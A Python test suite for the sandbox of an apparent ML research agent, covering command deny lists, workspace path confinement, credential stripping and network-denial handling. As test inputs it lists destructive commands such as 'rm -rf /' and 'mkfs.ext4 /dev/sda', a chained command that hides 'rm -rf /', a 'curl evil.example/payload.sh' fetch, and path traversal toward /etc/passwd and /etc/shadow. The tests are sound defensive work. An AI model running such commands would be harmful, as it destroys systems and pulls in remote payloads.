"""Sandbox: third-party code only ever runs here, so the boundaries are tested
as security properties rather than as behaviour.

One honest caveat: on the ``subprocess`` backend, ``network: deny`` is a
cooperative hint (proxy env vars), not an enforced boundary -- a raw socket
ignores it. Only the container backend enforces denial at the network layer,
and ``enforces_network_policy`` is the property that says so.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from ml_research_agent.config import Config, SandboxConfig
from ml_research_agent.errors import SandboxViolation
from ml_research_agent.experiments.sandbox import STRIPPED_ENV, Sandbox


class _RecordingLogger:
    """Captures structured events so a test can assert on them by name."""

    def __init__(self) -> None:
        self.warnings: list[str] = []

    def bind(self, **_context: object) -> _RecordingLogger:
        return self

    def warning(self, event: str, **_fields: object) -> None:
        self.warnings.append(event)

    def info(self, event: str, **_fields: object) -> None:
        pass

    def debug(self, event: str, **_fields: object) -> None:
        pass

    def error(self, event: str, **_fields: object) -> None:
        pass


@pytest.fixture
def sandbox(tmp_path):
    workspace = tmp_path / "ws"
    workspace.mkdir()
    return Sandbox(SandboxConfig(), workspace)


class TestCommandPolicy:
    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /",
            "shutdown now",
            "mkfs.ext4 /dev/sda",
            "echo hi && rm -rf / --no-preserve-root",
        ],
    )
    def test_destructive_commands_are_refused(self, sandbox, command):
        with pytest.raises(SandboxViolation):
            sandbox.check_command(command)

    def test_configured_deny_list_is_enforced(self, tmp_path):
        workspace = tmp_path / "ws"
        workspace.mkdir()
        box = Sandbox(SandboxConfig(denied_commands=["curl evil.example"]), workspace)
        with pytest.raises(SandboxViolation):
            box.run("curl evil.example/payload.sh")

    def test_ordinary_commands_are_allowed(self, sandbox):
        sandbox.check_command("python train.py --seed 0")


class TestFilesystemScope:
    def test_traversal_out_of_the_workspace_is_impossible(self, sandbox):
        for escape in ("../../etc/passwd", "/etc/passwd", "a/../../../../etc/shadow"):
            with pytest.raises(SandboxViolation):
                sandbox.resolve_path(escape)

    def test_paths_inside_the_workspace_resolve(self, sandbox):
        resolved = sandbox.resolve_path("code/train.py")
        assert str(resolved).startswith(str(sandbox.workspace))


class TestEnvironment:
    def test_credentials_are_stripped(self, sandbox, monkeypatch):
        # Named explicitly rather than looped over STRIPPED_ENV alone: a test
        # that only iterates the module's own list passes vacuously if that
        # list is ever emptied, which is the regression that matters most.
        assert "ANTHROPIC_API_KEY" in STRIPPED_ENV
        for name in STRIPPED_ENV:
            monkeypatch.setenv(name, "sk-must-not-reach-the-child")
        monkeypatch.setenv("MRA_HARMLESS", "keep-me")

        env = sandbox.build_env()

        for name in STRIPPED_ENV:
            assert name not in env
        assert "sk-must-not-reach-the-child" not in env.values()
        assert env.get("MRA_HARMLESS") == "keep-me", (
            "stripping must be targeted, not a wholesale env wipe"
        )

    def test_network_denial_is_signalled_to_the_child(self, sandbox):
        env = sandbox.build_env()
        assert env["HTTP_PROXY"].endswith(":9")

    def test_gpu_can_be_hidden(self, tmp_path):
        workspace = tmp_path / "ws"
        workspace.mkdir()
        box = Sandbox(SandboxConfig(gpu="none"), workspace)
        assert box.build_env()["CUDA_VISIBLE_DEVICES"] == ""


class TestExecution:
    def test_successful_command_captures_stdout(self, sandbox):
        result = sandbox.run("echo hello-from-sandbox")
        assert result.ok
        assert "hello-from-sandbox" in result.stdout

    def test_nonzero_exit_is_reported_not_raised(self, sandbox):
        result = sandbox.run("exit 3")
        assert not result.ok
        assert result.exit_code == 3

    def test_timeout_kills_the_process(self, sandbox):
        result = sandbox.run("sleep 30", timeout=1)
        assert result.timed_out
        assert not result.ok
        assert result.duration_seconds < 15

    def test_output_is_truncated_with_a_visible_marker(self, tmp_path):
        workspace = tmp_path / "ws"
        workspace.mkdir()
        box = Sandbox(SandboxConfig(), workspace, max_output_chars=500)
        result = box.run("python3 -c \"print('x' * 20000)\"")
        assert "truncated" in result.stdout
        assert len(result.stdout) < 2000

    def test_runs_inside_the_workspace(self, sandbox):
        result = sandbox.run("pwd")
        assert str(sandbox.workspace) in result.stdout


class TestRemoteBackendDoesNotSilentlyDowngrade:
    def test_remote_refuses_rather_than_running_locally(self, tmp_path):
        config = Config(paths={"workspace": tmp_path}, sandbox={"backend": "remote"})
        box = Sandbox.for_config(config, tmp_path)
        with pytest.raises(SandboxViolation):
            box.run("echo should-not-run")

    def test_docker_backend_builds_an_isolated_command(self, tmp_path):
        config = Config(
            paths={"workspace": tmp_path}, sandbox={"backend": "docker", "network": "deny"}
        )
        box = Sandbox.for_config(config, tmp_path)
        wrapped = box.wrap_command("python train.py")
        assert wrapped[0] == "docker"
        assert "--network" in wrapped and "none" in wrapped


class TestNoCredentialReachesSandboxedCode:
    """Third-party code runs here; the project's keys must not travel with it."""

    def test_named_credentials_are_stripped(self, sandbox, monkeypatch):
        for name in STRIPPED_ENV:
            monkeypatch.setenv(name, "secret-value")
        env = sandbox.build_env()
        assert not [n for n in STRIPPED_ENV if n in env]

    @pytest.mark.parametrize(
        "name",
        ["SOME_NEW_API_KEY", "VENDOR_TOKEN", "DB_PASSWORD", "APP_SECRET", "GCP_CREDENTIALS"],
    )
    def test_credential_shaped_names_are_stripped_too(self, sandbox, monkeypatch, name):
        # Adding a provider to .env must not silently hand its key to repo code.
        monkeypatch.setenv(name, "secret-value")
        assert name not in sandbox.build_env()

    def test_ordinary_variables_survive(self, sandbox, monkeypatch):
        monkeypatch.setenv("CUDA_HOME", "/usr/local/cuda")
        assert sandbox.build_env()["CUDA_HOME"] == "/usr/local/cuda"

    def test_no_secret_value_leaks_through_any_variable(self, sandbox, monkeypatch):
        monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-do-not-leak")
        assert "sk-ant-do-not-leak" not in " ".join(sandbox.build_env().values())


class TestNetworkDenialIsHonestAboutItself:
    def test_subprocess_backend_admits_denial_is_advisory(self, sandbox):
        assert sandbox.config.network == "deny"
        assert not sandbox.enforces_network_policy

    def test_docker_backend_enforces_denial(self, tmp_path):
        config = Config(paths={"workspace": tmp_path}, sandbox={"backend": "docker"})
        assert Sandbox.for_config(config, tmp_path).enforces_network_policy

    def test_running_under_an_advisory_policy_warns(self, tmp_path):
        # Silent advisory denial is how a "sandboxed" run quietly reaches the
        # network; the warning is what makes that visible in the log.
        recorder = _RecordingLogger()
        workspace = tmp_path / "ws"
        workspace.mkdir()
        box = Sandbox(SandboxConfig(network="deny"), workspace, logger=recorder)

        box.run("echo hi")

        assert "network_denial_is_advisory" in recorder.warnings

    def test_no_warning_when_the_policy_is_enforceable(self, tmp_path):
        recorder = _RecordingLogger()
        workspace = tmp_path / "ws"
        workspace.mkdir()
        box = Sandbox(SandboxConfig(network="allow"), workspace, logger=recorder)

        box.run("echo hi")

        assert "network_denial_is_advisory" not in recorder.warnings


class TestTheSafetyKnobsAreActuallyWired:
    """A config knob nothing reads is a guard that is wrong *and* unreachable.

    Each of these was documented in `configs/default.yaml` and read by nothing.
    """

    def test_network_denial_does_not_exempt_every_host(self):
        # `no_proxy="*"` exempts every host from the blackhole proxy, so denial
        # permits everything. The allow-list is what no_proxy is for.
        workspace_config = SandboxConfig(network="deny", network_allowlist=["pypi.org"])
        env = Sandbox(workspace_config, Path("/tmp")).build_env()
        assert env["no_proxy"] != "*"
        assert env["no_proxy"] == "pypi.org"
        assert env["HTTP_PROXY"].endswith(":9")
        assert env["http_proxy"] == env["HTTP_PROXY"], "lowercase form is honoured by urllib"

    def test_an_empty_allowlist_denies_everything(self):
        env = Sandbox(SandboxConfig(network="deny", network_allowlist=[]), Path("/tmp")).build_env()
        assert env["no_proxy"] == ""

    def test_allowed_network_sets_no_proxy_at_all(self):
        env = Sandbox(SandboxConfig(network="allow"), Path("/tmp")).build_env()
        assert "HTTP_PROXY" not in env or not env.get("HTTP_PROXY", "").endswith(":9")

    def test_untrusted_repo_code_is_refused_by_default(self, sandbox):
        assert not sandbox.allow_untrusted
        with pytest.raises(SandboxViolation, match="run_untrusted_code"):
            sandbox.run("python setup.py install", untrusted=True)

    def test_trusted_commands_are_unaffected(self, sandbox):
        assert sandbox.run("echo ours").ok

    def test_the_knob_can_be_turned_on_deliberately(self, tmp_path):
        workspace = tmp_path / "ws"
        workspace.mkdir()
        box = Sandbox(SandboxConfig(), workspace, allow_untrusted=True)
        assert box.run("echo theirs", untrusted=True).ok

    def test_for_config_reads_the_knob(self, tmp_path):
        permissive = Config(paths={"workspace": tmp_path}, code={"run_untrusted_code": True})
        strict = Config(paths={"workspace": tmp_path})
        assert Sandbox.for_config(permissive, tmp_path).allow_untrusted
        assert not Sandbox.for_config(strict, tmp_path).allow_untrusted
